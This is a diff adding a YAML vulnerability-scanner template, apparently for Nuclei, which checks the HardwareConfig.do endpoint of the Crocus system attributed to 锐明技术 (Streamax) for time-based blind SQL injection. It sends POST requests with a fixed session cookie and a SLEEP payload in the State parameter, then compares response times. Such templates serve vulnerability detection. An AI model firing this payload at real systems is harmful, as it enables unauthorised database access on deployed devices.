@@ -1,0 +1,59 @@
+id: poc-yaml-crocus-hardwareconfig-do-sqli
+info:
+  name: 锐明技术 Crocus系统 HardwareConfig.do SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: 锐明技术,Crocus系统
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/HardwareConfig.do"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "\"Code\":202"
+
+  - raw:
+      - |
+        POST /HardwareConfig.do?Action=ReadTask HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: Saffron.U=VUlEPTEmVU49MQ==
+        Content-Type: application/x-www-form-urlencoded
+        
+        PageIndex=0&PageSize=20&State=(select*from(select%09if(ascii(substr(current_user,1,1))>1,sleep(5),1))a)
+      - |
+        POST /HardwareConfig.do?Action=ReadTask HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: Saffron.U=VUlEPTEmVU49MQ==
+        Content-Type: application/x-www-form-urlencoded
+        
+        PageIndex=0&PageSize=20&State=(select*from(select%09if(ascii(substr(current_user,1,1))>1,sleep(8),1))a)
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "\"Code\":200"
+          - "\"Result\":"
+      - type: word
+        part: body
+        words:
+          - "<"
+        negative: true
+      - type: dsl
+        dsl:
+          - 'duration_1>=5 && duration_1<=6'
+          - 'duration_2 - duration_1 >2'
+        condition: and
